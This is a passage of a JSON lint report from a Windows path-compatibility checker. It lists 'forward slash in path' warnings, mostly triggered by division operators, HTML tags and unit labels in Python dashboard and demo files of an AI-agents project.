        "warning": "Line 472: Forward slash in path - \" were publicly available information and collaborative work product \n        under the JDA.\n        \n        IV. CONCLUSION\n        \n        For the foregoing reasons, MegaCorp respectfully requests that this Court \n        grant its Motion to Dismiss with prejudice.\n        \n        Respectfully submitted,\n        \n        WILSON, BRADLEY & ASSOCIATES LLP\n        \n        By: /s/ Sarah M. Wilson\n        Sarah M. Wilson (Bar No. 234567)\n        1000 Montgomery Street, Suite 1500  \n        San Francisco, CA 94104\n        Telephone: (415) 555-0123\n        Email: swilson@wilsonbradley.com\n        \n        Attorneys for Defendant MegaCorp Enterprises LLC\n        \n        Filed: January 15, 2024\n        Hearing Date: March 1, 2024 at 10:00 AM\n        Courtroom: 4, 17th Floor\n        \"",
        "timestamp": "2025-09-05T17:30:42.259132"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 587: Forward slash in path - '])\n        accuracy = correct_count / len(classification_results)\n        avg_confidence = statistics.mean([r['",
        "timestamp": "2025-09-05T17:30:42.259206"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 593: Forward slash in path - \"   Accuracy: {accuracy:.1%} ({correct_count}/{len(classification_results)})\"",
        "timestamp": "2025-09-05T17:30:42.259231"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 717: Forward slash in path - \" * 60)\n    \n    # Create temporary files for batch processing\n    import tempfile\n    temp_files = []\n    \n    try:\n        with tempfile.TemporaryDirectory() as temp_dir:\n            temp_path = Path(temp_dir)\n            \n            # Create files for batch processing\n            for doc_name, doc_data in DEMO_DOCUMENTS.items():\n                file_path = temp_path / f\"",
        "timestamp": "2025-09-05T17:30:42.259329"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 733: Forward slash in path - \")\n            \n            # Process batch\n            start_time = time.perf_counter()\n            results = await processor.batch_process_documents(temp_files)\n            end_time = time.perf_counter()\n            \n            batch_time = end_time - start_time\n            throughput = len(temp_files) / (batch_time / 3600)  # docs per hour\n            \n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.259360"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 746: Forward slash in path - \"   Throughput: {throughput:.0f} documents/hour\"",
        "timestamp": "2025-09-05T17:30:42.259388"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 749: Forward slash in path - ', False))\n            success_rate = successful / len(results) if results else 0.0\n            \n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.259416"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 815: Forward slash in path - \"\\n📈 PROJECTED ANNUAL SAVINGS (10,000 docs/year):\"",
        "timestamp": "2025-09-05T17:30:42.259483"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 818: Forward slash in path - \")\n    \n    # ROI calculation\n    system_development_cost = 50000  # Example development cost\n    roi_months = system_development_cost / (annual_savings / 12) if annual_savings > 0 else float('",
        "timestamp": "2025-09-05T17:30:42.259514"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 879: Forward slash in path - \"✅ Cost Efficiency ($0.05/doc)\"",
        "timestamp": "2025-09-05T17:30:42.259581"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 881: Forward slash in path - \"❌ Cost Efficiency ($0.05/doc)\"",
        "timestamp": "2025-09-05T17:30:42.259611"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 156: Forward slash in path - 'Volume/Accuracy'",
        "timestamp": "2025-09-05T17:30:42.260092"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 157: Forward slash in path - '])\n            ),\n            row=2, col=1\n        )\n        \n        # Efficiency score (accuracy / processing_time)\n        efficiency_score = doc_df['",
        "timestamp": "2025-09-05T17:30:42.260109"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 163: Forward slash in path - '] / doc_df['",
        "timestamp": "2025-09-05T17:30:42.260121"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 222: Forward slash in path - \")\n        \n        with col4:\n            anomaly_rate = (total_anomalies / data['",
        "timestamp": "2025-09-05T17:30:42.260191"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 272: Forward slash in path - '] / 30)  # Distribute monthly count across days\n                anomaly_trends.append({\n                    '",
        "timestamp": "2025-09-05T17:30:42.260248"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 341: Forward slash in path - \"**📋 Scheduled Reviews (High/Medium)**\"",
        "timestamp": "2025-09-05T17:30:42.260334"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 366: Forward slash in path - \")\n        \n        with col4:\n            avg_transaction = total_spending / total_documents if total_documents > 0 else 0\n            st.metric(\"",
        "timestamp": "2025-09-05T17:30:42.260376"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 415: Forward slash in path - '] / vendor_df['",
        "timestamp": "2025-09-05T17:30:42.260433"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 537: Forward slash in path - '] / vendor_df['",
        "timestamp": "2025-09-05T17:30:42.260558"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\document_intelligence.py",
        "warning": "Line 538: Forward slash in path - '] / vendor_df['",
        "timestamp": "2025-09-05T17:30:42.260585"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "warning": "Line 174: Forward slash in path - ',\n                marker=dict(\n                    size=[vol/100 for vol in volumes],  # Scale bubble size\n                    sizemode='",
        "timestamp": "2025-09-05T17:30:42.261437"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "warning": "Line 177: Forward slash in path - ',\n                    sizeref=max(volumes)/100000,\n                    color=colors,\n                    opacity=0.7,\n                    line=dict(width=2, color='",
        "timestamp": "2025-09-05T17:30:42.261464"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "warning": "Line 184: Forward slash in path - '<b>%{text}</b><br>'",
        "timestamp": "2025-09-05T17:30:42.261481"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "warning": "Line 187: Forward slash in path - '<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.261499"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "warning": "Line 280: Forward slash in path - \"Throughput/Hour\"",
        "timestamp": "2025-09-05T17:30:42.261582"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "warning": "Line 440: Forward slash in path - 'Real-Time Throughput (docs/min)'",
        "timestamp": "2025-09-05T17:30:42.261686"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "warning": "Line 477: Forward slash in path - \"Documents/min\"",
        "timestamp": "2025-09-05T17:30:42.261714"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 82: Forward slash in path - 'Documents/Min'",
        "timestamp": "2025-09-05T17:30:42.262410"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 86: Forward slash in path - '<b>Throughput</b><br>%{y:.1f} docs/min<br>%{x}<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.262425"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 100: Forward slash in path - '<b>Queue Size</b><br>%{y} documents<br>%{x}<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.262437"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 117: Forward slash in path - '<b>Trend</b><br>%{y:.1f} docs/min<br><extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.262449"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 131: Forward slash in path - \"Documents/Minute\"",
        "timestamp": "2025-09-05T17:30:42.262462"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 146: Forward slash in path - \"{current_throughput:.1f}/min\"",
        "timestamp": "2025-09-05T17:30:42.262480"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 165: Forward slash in path - \"{z[0]*10:.2f}/min per 10 intervals\"",
        "timestamp": "2025-09-05T17:30:42.262497"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 185: Forward slash in path - '] / 1000  # Scale down\n            \n            # Create wave pattern for this document type\n            for j, time_point in enumerate(x):\n                wave = base_volume * (1 + 0.3 * np.sin(time_point + i))\n                noise = np.random.uniform(-0.1, 0.1) * base_volume\n                Z[i, j] = max(0, wave + noise)\n        \n        # Create 3D surface plot\n        fig_3d_flow = go.Figure(data=[\n            go.Surface(\n                z=Z,\n                x=x,\n                y=[doc_type.replace('",
        "timestamp": "2025-09-05T17:30:42.262525"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 203: Forward slash in path - '<b>Document Type:</b> %{y}<br>'",
        "timestamp": "2025-09-05T17:30:42.262540"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 204: Forward slash in path - '<b>Time:</b> %{x:.1f}<br>'",
        "timestamp": "2025-09-05T17:30:42.262550"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 205: Forward slash in path - '<b>Volume:</b> %{z:.2f}<br>'",
        "timestamp": "2025-09-05T17:30:42.262559"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 206: Forward slash in path - '<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.262569"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 236: Forward slash in path - ': 1 / metrics['",
        "timestamp": "2025-09-05T17:30:42.262592"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 237: Forward slash in path - '] / metrics['",
        "timestamp": "2025-09-05T17:30:42.262604"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 259: Forward slash in path - '<b>%{text}</b><br>'",
        "timestamp": "2025-09-05T17:30:42.262627"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 260: Forward slash in path - '<b>Volume:</b> %{x:,}<br>'",
        "timestamp": "2025-09-05T17:30:42.262638"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 261: Forward slash in path - '<b>Accuracy:</b> %{y:.1f}%<br>'",
        "timestamp": "2025-09-05T17:30:42.262648"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 262: Forward slash in path - '<b>Speed:</b> %{z:.2f}<br>'",
        "timestamp": "2025-09-05T17:30:42.262659"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 263: Forward slash in path - '<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.262669"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 299: Forward slash in path - ']\n            \n            for j, hour in enumerate(x):\n                # Add hourly patterns (lower accuracy during night hours)\n                hour_factor = 0.95 + 0.05 * np.cos(2 * np.pi * hour / 24)  # Peak at noon\n                \n                # Add some document-type specific patterns\n                type_pattern = 1 + 0.02 * np.sin(i * np.pi / len(doc_types))\n                \n                # Random variation\n                noise = np.random.uniform(-0.5, 0.5)\n                \n                Z[i, j] = base_accuracy * hour_factor * type_pattern + noise\n        \n        # Create 3D surface\n        fig_accuracy_surface = go.Figure(data=[\n            go.Surface(\n                z=Z,\n                x=x,\n                y=[doc_type.replace('",
        "timestamp": "2025-09-05T17:30:42.262708"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 322: Forward slash in path - '<b>Hour:</b> %{x:.0f}:00<br>'",
        "timestamp": "2025-09-05T17:30:42.262723"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 323: Forward slash in path - '<b>Document Type:</b> %{y}<br>'",
        "timestamp": "2025-09-05T17:30:42.262735"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 324: Forward slash in path - '<b>Accuracy:</b> %{z:.1f}%<br>'",
        "timestamp": "2025-09-05T17:30:42.262767"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 325: Forward slash in path - '<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.262789"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 396: Forward slash in path - '] / 20000) * 100)  # Assuming 20k is max\n            accuracy_score = doc_data['",
        "timestamp": "2025-09-05T17:30:42.262841"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 413: Forward slash in path - '<b>Document Type:</b> %{y}<br>'",
        "timestamp": "2025-09-05T17:30:42.262864"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 414: Forward slash in path - '<b>Metric:</b> %{x}<br>'",
        "timestamp": "2025-09-05T17:30:42.262878"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 415: Forward slash in path - '<b>Score:</b> %{z:.1f}<br>'",
        "timestamp": "2025-09-05T17:30:42.262892"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 416: Forward slash in path - '<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.262905"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 491: Forward slash in path - '] / 200,  # Scale marker size\n                color=geo_df['",
        "timestamp": "2025-09-05T17:30:42.262967"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 501: Forward slash in path - '<b>%{text}</b><br>'",
        "timestamp": "2025-09-05T17:30:42.262987"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\real_time_charts.py",
        "warning": "Line 504: Forward slash in path - '<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.263005"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 51: Forward slash in path - \"Manual Cost/Doc\"",
        "timestamp": "2025-09-05T17:30:42.263468"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 58: Forward slash in path - \"Automated Cost/Doc\"",
        "timestamp": "2025-09-05T17:30:42.263480"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 105: Forward slash in path - '] / 12  # Assuming yearly data\n            \n            manual_monthly_cost = monthly_docs * cost_data['",
        "timestamp": "2025-09-05T17:30:42.263513"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 138: Forward slash in path - '] / 12\n        monthly_savings = monthly_volume * data['",
        "timestamp": "2025-09-05T17:30:42.263543"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 139: Forward slash in path - ']\n        \n        for i in range(months):\n            month_date = start_date + timedelta(days=30*i)\n            \n            # Add some realistic growth and seasonality\n            growth_factor = 1 + (i * 0.05)  # 5% monthly growth\n            seasonal_factor = 1 + 0.2 * math.sin(2 * math.pi * i / 12)  # Seasonal variation\n            \n            monthly_docs = monthly_volume * growth_factor * seasonal_factor\n            monthly_saving = monthly_docs * data['",
        "timestamp": "2025-09-05T17:30:42.263555"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 163: Forward slash in path - ': (cumulative_savings / self.cost_assumptions['",
        "timestamp": "2025-09-05T17:30:42.263573"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 226: Forward slash in path - 'Volume/Savings'",
        "timestamp": "2025-09-05T17:30:42.263612"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 259: Forward slash in path - '] / (monthly_savings - self.cost_assumptions['",
        "timestamp": "2025-09-05T17:30:42.263638"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 310: Forward slash in path - '] / 12),\n                    step=1000\n                )\n            \n            with col2:\n                ai_cost = st.slider(\n                    \"",
        "timestamp": "2025-09-05T17:30:42.263678"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 336: Forward slash in path - '],\n                    step=5000\n                )\n        \n        # Calculate ROI with custom parameters\n        manual_cost_per_doc = (manual_rate / 60) * processing_time\n        savings_per_doc = manual_cost_per_doc - ai_cost\n        monthly_savings = monthly_volume * savings_per_doc\n        net_monthly_savings = monthly_savings - infrastructure_cost\n        annual_net_savings = net_monthly_savings * 12\n        payback_months = setup_cost / net_monthly_savings if net_monthly_savings > 0 else float('",
        "timestamp": "2025-09-05T17:30:42.263707"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 346: Forward slash in path - ')\n        roi_percentage = ((savings_per_doc / manual_cost_per_doc) * 100) if manual_cost_per_doc > 0 else 0\n        \n        # Display calculated results\n        st.markdown(\"",
        "timestamp": "2025-09-05T17:30:42.263721"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 356: Forward slash in path - \"Cost Savings/Doc\"",
        "timestamp": "2025-09-05T17:30:42.263734"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 378: Forward slash in path - \"{(annual_net_savings/setup_cost)*100:.0f}%\"",
        "timestamp": "2025-09-05T17:30:42.263755"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 378: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.263767"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 395: Forward slash in path - ': (cumulative_savings / setup_cost) * 100 if setup_cost > 0 else 0\n            })\n        \n        roi_df = pd.DataFrame(roi_projection)\n        \n        # Create projection chart\n        fig_projection = make_subplots(\n            rows=1, cols=2,\n            subplot_titles=('",
        "timestamp": "2025-09-05T17:30:42.263791"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 455: Forward slash in path - '] / 60)\n            automated_hours_used = data['",
        "timestamp": "2025-09-05T17:30:42.263832"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 460: Forward slash in path - ': (manual_hours_saved - automated_hours_used) / (40 * 52),  # 40 hrs/week, 52 weeks/year\n                '",
        "timestamp": "2025-09-05T17:30:42.263850"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 461: Forward slash in path - ': (manual_hours_saved / automated_hours_used) if automated_hours_used > 0 else 0,\n                '",
        "timestamp": "2025-09-05T17:30:42.263865"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\roi_analytics.py",
        "warning": "Line 498: Forward slash in path - \"🔄 **Consistency**: 24/7 processing with minimal human intervention\"",
        "timestamp": "2025-09-05T17:30:42.263908"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 75: Forward slash in path - \"\n        )\n        \n        # Static files\n        dashboard_path = Path(__file__).parent\n        static_path = dashboard_path / \"",
        "timestamp": "2025-09-05T17:30:42.264385"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 82: Forward slash in path - \"/static\"",
        "timestamp": "2025-09-05T17:30:42.264396"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 85: Forward slash in path - \"/ws\"",
        "timestamp": "2025-09-05T17:30:42.264405"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 104: Forward slash in path - \"/\"",
        "timestamp": "2025-09-05T17:30:42.264416"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 109: Forward slash in path - \"/api/agents\"",
        "timestamp": "2025-09-05T17:30:42.264424"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 126: Forward slash in path - \"/api/metrics\"",
        "timestamp": "2025-09-05T17:30:42.264441"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 131: Forward slash in path - \"/api/interactions\"",
        "timestamp": "2025-09-05T17:30:42.264451"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 139: Forward slash in path - \"/api/agents/{agent_name}/task\"",
        "timestamp": "2025-09-05T17:30:42.264465"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 298: Forward slash in path - \": 0.5}\n        \n        index = agents_list.index(agent_name)\n        total_agents = len(agents_list)\n        \n        # Arrange in circle\n        import math\n        angle = (2 * math.pi * index) / total_agents\n        radius = 0.3\n        \n        x = 0.5 + radius * math.cos(angle)\n        y = 0.5 + radius * math.sin(angle)\n        \n        return {\"",
        "timestamp": "2025-09-05T17:30:42.264573"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 366: Forward slash in path - \">\n            <title>{self.dashboard_title}</title>\n            <style>\n                body {{\n                    font-family: -apple-system, BlinkMacSystemFont, '",
        "timestamp": "2025-09-05T17:30:42.264627"
      },
      {
        "category": "WINDOWS_COMPAT",
